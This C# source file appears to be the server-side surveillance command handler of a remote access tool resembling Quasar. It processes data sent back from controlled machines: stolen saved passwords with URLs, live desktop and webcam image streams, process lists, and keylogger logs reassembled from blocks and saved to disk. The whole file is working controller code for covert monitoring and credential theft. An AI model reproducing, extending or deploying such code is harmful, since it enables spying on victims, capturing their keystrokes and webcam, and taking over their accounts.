using System;
using System.IO;
using System.Linq;
using System.Drawing;
using System.Threading;
using xServer.Core.Data;
using xServer.Core.Helper;
using xServer.Core.Networking;
using xServer.Core.Packets.ClientPackets;
using xServer.Core.Packets.ServerPackets;
using xServer.Core.Utilities;

namespace xServer.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE SURVEILLANCE COMMANDS. */
    public static partial class CommandHandler
    {
        public static void HandleGetPasswordsResponse(Client client, GetPasswordsResponse packet)
        {
            if (client.Value == null || client.Value.FrmPass == null)
                return;

            if (packet.Passwords == null)
                return;

            string userAtPc = string.Format("{0}@{1}", client.Value.Username, client.Value.PCName);

            var lst =
                packet.Passwords.Select(str => str.Split(new[] {DELIMITER}, StringSplitOptions.None))
                    .Select(
                        values =>
                            new RecoveredAccount
                            {
                                Username = values[0],
                                Password = values[1],
                                URL = values[2],
                                Application = values[3]
                            })
                    .ToList();

            if (client.Value != null && client.Value.FrmPass != null)
                client.Value.FrmPass.AddPasswords(lst.ToArray(), userAtPc);
        }
        public static void HandleGetDesktopResponse(Client client, GetDesktopResponse packet)
        {
            if (client.Value == null 
                || client.Value.FrmRdp == null 
                || client.Value.FrmRdp.IsDisposed 
                || client.Value.FrmRdp.Disposing)
                return;

            if (packet.Image == null)
                return;

            if (client.Value.StreamCodec == null)
                client.Value.StreamCodec = new UnsafeStreamCodec(packet.Quality, packet.Monitor, packet.Resolution);

            if (client.Value.StreamCodec.ImageQuality != packet.Quality || client.Value.StreamCodec.Monitor != packet.Monitor
                || client.Value.StreamCodec.Resolution != packet.Resolution)
            {
                if (client.Value.StreamCodec != null)
                    client.Value.StreamCodec.Dispose();

                client.Value.StreamCodec = new UnsafeStreamCodec(packet.Quality, packet.Monitor, packet.Resolution);
            }

            using (MemoryStream ms = new MemoryStream(packet.Image))
            {
                client.Value.FrmRdp.UpdateImage(client.Value.StreamCodec.DecodeData(ms), true);
            }

            packet.Image = null;

            if (client.Value != null && client.Value.FrmRdp != null && client.Value.FrmRdp.IsStarted)
                new GetDesktop(packet.Quality, packet.Monitor).Execute(client);
        }

        public static void HandleGetProcessesResponse(Client client, GetProcessesResponse packet)
        {
            if (client.Value == null || client.Value.FrmTm == null)
                return;

            client.Value.FrmTm.ClearListviewItems();

            // None of the arrays containing the process' information can be null.
            // The must also be the exact same length because each entry in the three
            // different arrays represents one process.
            if (packet.Processes == null || packet.IDs == null || packet.Titles == null ||
                packet.Processes.Length != packet.IDs.Length || packet.Processes.Length != packet.Titles.Length)
                return;

            new Thread(() =>
            {
                if (client.Value != null && client.Value.FrmTm != null)
                    client.Value.FrmTm.SetProcessesCount(packet.Processes.Length);

                for (int i = 0; i < packet.Processes.Length; i++)
                {
                    if (packet.IDs[i] == 0 || packet.Processes[i] == "System.exe")
                        continue;

                    if (client.Value == null || client.Value.FrmTm == null)
                        break;
                    
                    client.Value.FrmTm.AddProcessToListview(packet.Processes[i], packet.IDs[i], packet.Titles[i]);
                }
            }).Start();
        }

        public static void HandleGetKeyloggerLogsResponse(Client client, GetKeyloggerLogsResponse packet)
        {
            if (client.Value == null || client.Value.FrmKl == null)
                return;

            if (packet.FileCount == 0)
            {
                client.Value.FrmKl.SetGetLogsEnabled(true);
                return;
            }

            if (string.IsNullOrEmpty(packet.Filename))
                return;

            string downloadPath = Path.Combine(client.Value.DownloadDirectory, "Logs\\");

            if (!Directory.Exists(downloadPath))
                Directory.CreateDirectory(downloadPath);

            downloadPath = Path.Combine(downloadPath, packet.Filename + ".html");

            FileSplit destFile = new FileSplit(downloadPath);

            destFile.AppendBlock(packet.Block, packet.CurrentBlock);

            if ((packet.CurrentBlock + 1) == packet.MaxBlocks)
            {
                try
                {
                    File.WriteAllText(downloadPath, FileHelper.ReadLogFile(downloadPath));
                }
                catch
                {
                }

                if (packet.Index == packet.FileCount)
                {
                    FileInfo[] iFiles =
                        new DirectoryInfo(Path.Combine(client.Value.DownloadDirectory, "Logs\\")).GetFiles();

                    if (iFiles.Length == 0)
                        return;

                    foreach (FileInfo file in iFiles)
                    {
                        if (client.Value == null || client.Value.FrmKl == null)
                            break;

                        client.Value.FrmKl.AddLogToListview(file.Name);
                    }

                    if (client.Value == null || client.Value.FrmKl == null)
                        return;

                    client.Value.FrmKl.SetGetLogsEnabled(true);
                }
            }
        }

        public static void HandleGetMonitorsResponse(Client client, GetMonitorsResponse packet)
        {
            if (client.Value == null || client.Value.FrmRdp == null)
                return;

            client.Value.FrmRdp.AddMonitors(packet.Number);
        }

        public static void HandleGetWebcamsResponse(Client client, GetWebcamsResponse packet)
        {
            if (client.Value == null || client.Value.FrmWebcam == null)
                return;

            client.Value.FrmWebcam.AddWebcams(packet.Webcams);
        }

        public static void HandleGetWebcamResponse(Client client, GetWebcamResponse packet)
        {
            if (client.Value == null ||  client.Value.FrmWebcam == null
                || client.Value.FrmWebcam.IsDisposed
                || client.Value.FrmWebcam.Disposing)
                return;

            if (packet.Image == null)
                return;

            using (MemoryStream ms = new MemoryStream(packet.Image))
            {
                Bitmap img = new Bitmap(ms);
                client.Value.FrmWebcam.UpdateImage(img);
            }

            if (client.Value != null && client.Value.FrmWebcam != null && client.Value.FrmWebcam.IsStarted)
            {
                new GetWebcam(packet.Webcam, packet.Resolution).Execute(client);
            }
        }
    }
}